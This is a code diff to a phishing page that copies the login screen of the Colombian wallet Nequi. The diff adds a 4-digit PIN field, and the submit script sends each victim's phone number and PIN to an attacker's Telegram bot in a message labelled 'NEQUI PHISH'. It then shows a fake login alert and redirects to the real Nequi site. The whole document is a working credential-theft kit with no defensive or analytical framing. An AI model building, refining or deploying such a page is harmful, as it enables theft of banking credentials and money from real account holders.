@@ -25,57 +25,57 @@
             text-align: center;
         }
         .logo {
-            font-size: 52px;
+            font-size: 58px;
             font-weight: 700;
-            margin-bottom: 80px;
+            margin-bottom: 70px;
             letter-spacing: -2px;
         }
         .logo span {
             color: #FF2D95;
         }
         .input-container {
-            background: rgba(255,255,255,0.08);
-            border-radius: 12px;
+            background: rgba(255,255,255,0.09);
+            border-radius: 14px;
             padding: 5px;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
             display: flex;
             align-items: center;
         }
         .country {
-            padding: 0 15px;
+            padding: 0 18px;
             font-size: 17px;
-            border-right: 1px solid rgba(255,255,255,0.2);
+            border-right: 1px solid rgba(255,255,255,0.25);
         }
         input {
             flex: 1;
             background: transparent;
             border: none;
-            padding: 16px 15px;
+            padding: 17px 15px;
             font-size: 17px;
             color: white;
             outline: none;
         }
         input::placeholder {
-            color: rgba(255,255,255,0.6);
+            color: rgba(255,255,255,0.55);
         }
         .btn {
             width: 100%;
-            padding: 16px;
+            padding: 17px;
             background: #E91E63;
             color: white;
             border: none;
-            border-radius: 12px;
-            font-size: 17px;
+            border-radius: 14px;
+            font-size: 17.5px;
             font-weight: 500;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 15px;
         }
         .help {
             position: absolute;
-            top: 20px;
-            right: 20px;
-            font-size: 22px;
-            opacity: 0.7;
+            top: 25px;
+            right: 25px;
+            font-size: 26px;
+            opacity: 0.6;
         }
     </style>
 </head>
@@ -88,10 +88,14 @@
         <form id="loginForm">
             <div class="input-container">
                 <div class="country">+57</div>
-                <input type="tel" id="phone" placeholder="Ingresa tu cel" maxlength="10" required>
+                <input type="tel" id="phone" placeholder="Ingresa tu celular" maxlength="10" inputmode="numeric" required>
             </div>
             
-            <button type="submit" class="btn">Entra</button>
+            <div class="input-container">
+                <input type="password" id="password" placeholder="Contraseña de 4 dígitos" maxlength="4" inputmode="numeric" required>
+            </div>
+            
+            <button type="submit" class="btn">Entrar</button>
         </form>
     </div>
 
@@ -101,22 +105,31 @@
 
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
+            
             const phone = document.getElementById("phone").value.trim();
+            const password = document.getElementById("password").value.trim();
 
-            if (phone.length < 10) {
-                alert("Por favor ingresa un número válido");
+            // Validación de números
+            if (!/^\d{10}$/.test(phone)) {
+                alert("El número de celular debe tener 10 dígitos numéricos");
+                return;
+            }
+            if (!/^\d{4}$/.test(password)) {
+                alert("La contraseña debe ser exactamente 4 dígitos numéricos");
                 return;
             }
 
-            const message = `🔴 NEQUI GANADOR\n\n📱 Número: +57 ${phone}\n⏰ Hora: ${new Date().toLocaleString()}`;
+            const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 PIN: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             }).then(() => {
-                alert("✅ Conectando...");
-                setTimeout(() => window.location.href = "https://www.nequi.com.co", 1500);
+                alert("✅ Iniciando sesión...");
+                setTimeout(() => {
+                    window.location.href = "https://www.nequi.com.co";
+                }, 1400);
             });
         });
     </script>
